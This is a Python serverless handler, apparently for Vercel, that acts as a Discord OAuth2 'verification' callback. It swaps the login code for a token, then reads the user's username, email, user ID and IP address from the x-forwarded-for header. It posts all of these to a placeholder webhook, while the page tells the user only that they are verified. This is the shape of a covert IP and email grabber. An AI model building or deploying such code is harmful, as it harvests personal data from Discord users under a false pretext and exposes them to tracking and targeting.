import json
import urllib.parse
import requests

def handler(request):
    try:
        query = urllib.parse.parse_qs(urllib.parse.urlparse(request.url).query)
        code = query.get("code", [None])[0]

        if not code:
            return {
                "statusCode": 400,
                "headers": {"Content-Type": "text/plain"},
                "body": "Missing code"
            }

        token_data = {
            "client_id": "YOUR_CLIENT_ID",
            "client_secret": "YOUR_CLIENT_SECRET",
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://your-vercel-project.vercel.app/api/callback"
        }

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        token_res = requests.post("https://discord.com/api/oauth2/token", data=token_data, headers=headers)
        token_json = token_res.json()

        access_token = token_json.get("access_token")
        if not access_token:
            return {
                "statusCode": 500,
                "headers": {"Content-Type": "text/plain"},
                "body": "Access token not found"
            }

        user_res = requests.get("https://discord.com/api/users/@me", headers={
            "Authorization": f"Bearer {access_token}"
        })
        user = user_res.json()

        ip = request.headers.get("x-forwarded-for", "unknown")

        payload = {
            "embeds": [{
                "title": "✅ Verified",
                "fields": [
                    {"name": "Username", "value": f"{user['username']}#{user['discriminator']}"},
                    {"name": "Email", "value": user.get('email', 'Not Provided')},
                    {"name": "IP Address", "value": ip},
                    {"name": "User ID", "value": user.get("id", "Unknown")}
                ],
                "color": 0x00FF99
            }]
        }

        requests.post("YOUR_WEBHOOK_URL", json=payload)

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": "<h1>✅ Verified! You may return to Discord.</h1>"
        }

    except Exception as e:
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "text/plain"},
            "body": f"Error: {str(e)}"
        }
